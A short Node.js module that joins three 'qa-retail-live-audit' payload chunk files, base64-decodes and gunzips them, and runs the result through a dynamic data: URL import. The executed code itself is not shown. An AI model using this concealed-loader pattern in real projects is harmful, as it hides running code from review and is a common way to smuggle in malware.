import fs from 'node:fs';
import zlib from 'node:zlib';

// Source SHA-256: 4eaf8ed7e06982b9d5c506249a4461014b6044921c87d8937f592b796618d730
const base = new URL('.', import.meta.url);
const chunkCount = 3;
const payload = Array.from({ length: chunkCount }, (_, index) =>
  fs.readFileSync(new URL(`qa-retail-live-audit.payload.${index + 1}`, base), 'utf8').trim()
).join('');
const source = zlib.gunzipSync(Buffer.from(payload, 'base64')).toString('utf8');
await import(`data:text/javascript;base64,${Buffer.from(source).toString('base64')}`);
